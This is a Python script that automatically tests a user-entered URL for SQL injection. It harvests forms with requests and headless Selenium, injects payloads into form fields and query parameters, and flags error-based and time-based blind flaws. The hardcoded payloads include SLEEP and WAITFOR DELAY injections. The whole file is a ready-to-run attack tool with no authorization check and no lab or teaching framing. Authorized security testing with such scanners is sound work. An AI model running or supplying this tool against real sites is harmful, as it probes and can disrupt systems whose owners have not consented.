import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import json
import time
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium import webdriver

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"

# Load SQL injection payloads from file
def load_payloads(filename="payloads.txt"):
    with open(filename, "r") as f:
        return [line.strip() for line in f if line.strip()]

# Extract forms using BeautifulSoup or fallback to Selenium
def get_forms(url):
    all_forms = []

    # Try extracting forms using requests
    try:
        print("[*] Trying to fetch forms via requests...")
        soup = BeautifulSoup(s.get(url).content, "html.parser")
        forms = soup.find_all("form")
        if forms:
            all_forms.extend(forms)
    except Exception as e:
        print(f"[!] Requests error: {e}")

    # Always attempt Selenium for JS-rendered forms
    print("[*] Also fetching forms via Selenium...")
    options = FirefoxOptions()
    options.add_argument("--headless")
    options.set_preference("general.useragent.override", s.headers["User-Agent"])
    driver = webdriver.Firefox(options=options)
    driver.get(url)
    soup = BeautifulSoup(driver.page_source, "html.parser")
    driver.quit()

    selenium_forms = soup.find_all("form")
    for form in selenium_forms:
        if form not in all_forms:  # Avoid duplicate forms
            all_forms.append(form)

    return all_forms

# Extract form details
def form_details(form):
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for tag in form.find_all(["input", "textarea", "select"]):
        input_type = tag.attrs.get("type", "text")
        input_name = tag.attrs.get("name")
        input_value = tag.attrs.get("value", "")
        if tag.name == "textarea":
            input_value = tag.text
        if input_name:
            inputs.append({"type": input_type, "name": input_name, "value": input_value})
    return {"action": action, "method": method, "inputs": inputs}

# Error-based vulnerability check
def is_vulnerable(response):
    errors = {
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "syntax error"
    }
    return any(error in response.text.lower() for error in errors)

# Time-based blind SQLi check
def is_time_delayed(url, method, data):
    start = time.time()
    if method == "post":
        s.post(url, data=data)
    else:
        s.get(url, params=data)
    end = time.time()
    return end - start > 4  # 5 sec threshold

# Scan form for error-based SQLi
def scan_form(url, form, payloads):
    details = form_details(form)
    target = urljoin(url, details["action"]) if details["action"] else url
    results = []

    for payload in payloads:
        data = {}
        for input_tag in details["inputs"]:
            if input_tag["type"] == "hidden" or input_tag["value"]:
                data[input_tag["name"]] = input_tag["value"] + payload
            elif input_tag["type"] != "submit":
                data[input_tag["name"]] = f"test{payload}"

        print(f"[*] Testing form at {target} with payload: {payload}")
        if details["method"] == "post":
            res = s.post(target, data=data)
        else:
            res = s.get(target, params=data)

        if is_vulnerable(res):
            print(f"[!!!] SQL Injection vulnerability detected in form at {target} with payload: {payload}")
            results.append({"type": "error", "url": target, "payload": payload, "method": details["method"], "data": data})
            break
    return results

# Scan form for time-based blind SQLi
def scan_form_blind(url, form, blind_payloads):
    details = form_details(form)
    target = urljoin(url, details["action"]) if details["action"] else url
    results = []

    for payload in blind_payloads:
        data = {}
        for input_tag in details["inputs"]:
            if input_tag["type"] == "hidden" or input_tag["value"]:
                data[input_tag["name"]] = input_tag["value"] + payload
            elif input_tag["type"] != "submit":
                data[input_tag["name"]] = f"test{payload}"

        print(f"[*] Testing BLIND form at {target} with payload: {payload}")
        if is_time_delayed(target, details["method"], data):
            print(f"[!!!] Blind SQLi detected at {target} with payload: {payload}")
            results.append({"type": "blind", "url": target, "payload": payload, "method": details["method"], "data": data})
            break
    return results


# Scan URL parameters for error-based SQLi
def scan_url_parameters(url, payloads):
    print(f"[+] Testing URL parameters for {url}")
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    vulnerable_points = []

    if not query:
        print("[*] No URL parameters to test.")
        return vulnerable_points

    for param in query:
        original_values = query.copy()
        for payload in payloads:
            injected_values = original_values.copy()
            injected_values[param] = [original_values[param][0] + payload]
            new_query = urlencode(injected_values, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))

            print(f"[*] Testing {new_url} with payload: {payload}")
            res = s.get(new_url)
            if is_vulnerable(res):
                print(f"[!!!] Potential SQL Injection found with param '{param}' and payload '{payload}'")
                vulnerable_points.append({"type": "error", "url": new_url, "param": param, "payload": payload})
                break
    return vulnerable_points


# Scan URL parameters for time-based blind SQLi
def scan_url_parameters_blind(url, blind_payloads):
    print(f"[+] Testing URL parameters for blind SQLi: {url}")
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    results = []

    if not query:
        return results

    for param in query:
        for payload in blind_payloads:
            test_query = query.copy()
            test_query[param] = [query[param][0] + payload]
            new_query = urlencode(test_query, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))

            print(f"[*] Testing BLIND param {param} with payload: {payload}")
            start = time.time()
            s.get(new_url)
            if time.time() - start > 4:
                print(f"[!!!] Blind SQL Injection vulnerability detected on {new_url}")
                results.append({"type": "blind", "url": new_url, "param": param, "payload": payload})
                break
    return results

# Main scanner


def scan_url(url):
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} form(s) on {url}")
    payloads = load_payloads()
    blind_payloads = ["' OR SLEEP(5)--", '" OR SLEEP(5)--', "'; WAITFOR DELAY '0:0:5'--"]

    final_results = []

    for form in forms:
        final_results.extend(scan_form(url, form, payloads))
        final_results.extend(scan_form_blind(url, form, blind_payloads))

    final_results.extend(scan_url_parameters(url, payloads))
    final_results.extend(scan_url_parameters_blind(url, blind_payloads))

    with open("results.json", "w") as f:
        json.dump(final_results, f, indent=4)

    print(f"\n[✓] Scan complete. {len(final_results)} issues saved to results.json")

if __name__ == "__main__":
    target_url = input("Please enter the URL to scan: ").strip()
    if not target_url:
        print("No URL entered, exiting.")
        exit(1)
    scan_url(target_url)
